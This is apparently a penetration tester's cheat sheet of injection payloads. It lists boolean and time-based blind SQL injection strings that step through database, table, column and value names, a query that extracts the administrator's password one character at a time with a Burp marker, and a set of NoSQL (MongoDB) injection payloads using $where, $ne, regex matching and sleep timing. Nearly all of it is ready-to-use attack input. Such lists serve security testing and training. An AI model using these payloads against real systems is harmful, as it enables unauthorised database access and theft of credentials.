## Blind SQLi (Boolean) ##

Change param in url. 

PARAM VALUE' union select 1,2,3;--

PARAM VALUE' union select 1,2,3 where database() like 'a%';-- (Will help get DB)

PARAM VALUE' union select 1,2,3 from information_schema.tables where table_schema = 'DB NAME' and table_name like 'a%';-- (Will help get tables)

PARAM VALUE' union select 1,2,3 from information_schema.columns where table_schema ='DB NAME' and table_name='TABLE NAME' and column_name like 'a%'; (Will help get columns)

PARAM VALUE' union select 1,2,3 from users where username like 'a% Will help get values from table and columns)

Simple Blind Query to pull administrator password. Substring is comparing password and pulling out the 7th character and starting at posistion 1.

' AND (SELECT SUBSTRING(password,7,1) FROM users WHERE username='administrator')='$Burp Marker$;

## Blind SQLi (Time) ##

Change param in url.

### TEST for SQLI Time Based ###

PARAM VALUE' union select SLEEP(5),2;--

PARAM VALUE' union select SLEEP(5),2 where database() like 'a%';-- (Will help get DB)

PARAM VALUE' union select SLEEP(5),2 from information_schema.tables where table_schema = 'DB NAME' and table_name like 'a%';-- (Will help get tables)

PARAM VALUE' union select SLEEP(5),2 from information_schema.columns where table_schema ='DB NAME' and table_name='TABLE NAME' and column_name like 'a%'; (Will help get columns)

PARAM VALUE' union select SLEEP(5),2 from users where username like 'a% Will help get values from table and columns)

### NoSQL Injection Payloads ### 
true, $where: '1 == 1'

, $where: '1 == 1'

$where: '1 == 1'

', $where: '1 == 1'

1, $where: '1 == 1'

{ $ne: 1 }

db.injection.insert({success:1});

db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emit(1,1

|| 1==1

' && this.password.match(/.*/)//+%00

' && this.passwordzz.match(/.*/)//+%00
'%20%26%26%20this.password.match(/.*/)//+%00

'%20%26%26%20this.passwordzz.match(/.*/)//+%00

{$gt: ''}

[$ne]=1

';return 'a'=='a' && ''=='

";return(true);var xyz='a

0;return true

username=test"+((this.username.match('^b.*')) ? sleep(5000) : sleep(100))+"&password=x

username=test%22%2b((this.token.match('.*'))%20%3f%20sleep(3000)%20%3a%20sleep(100))%2b%22&password=x

